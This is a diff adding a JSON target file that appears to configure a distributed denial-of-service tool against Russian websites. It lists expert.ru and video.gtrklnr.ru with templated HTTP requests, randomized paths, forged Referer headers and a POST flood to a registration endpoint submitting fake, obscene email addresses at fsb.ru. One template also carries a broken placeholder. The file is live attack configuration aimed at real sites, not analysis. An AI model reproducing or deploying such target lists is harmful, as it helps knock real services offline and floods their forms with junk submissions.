@@ -1,0 +1,30 @@
+{
+  "targets": [
+    {
+      "target": "https://expert.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://expert.ru/ekonomika/\"}",
+        "path_qs": "/ekonomika/{{int(1,1651}}/"
+      }
+    },
+    {
+      "target": "https://expert.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "body": "name=&email=cunt{{int(1,1000)}}%40fsb.ru&accepted_agreement=on",
+        "headers": "{\"Content-Type\": \"application/x-www-form-urlencoded; charset=UTF-8\", \"Referer\": \"https://expert.ru/search/\", \"X-Requested-With\": \"XMLHttpRequest\"}",
+        "path_qs": "/halfreg/",
+        "verb": "POST"
+      }
+    },
+    {
+      "target": "https://video.gtrklnr.ru",
+      "method": "HTTP_TEMPLATE",
+      "options": {
+        "headers": "{\"Referer\": \"https://video.gtrklnr.ru/\"}",
+        "path_qs": "/page/{{int(1,5)}}?search={{str(1)}}"
+      }
+    }
+  ]
+}
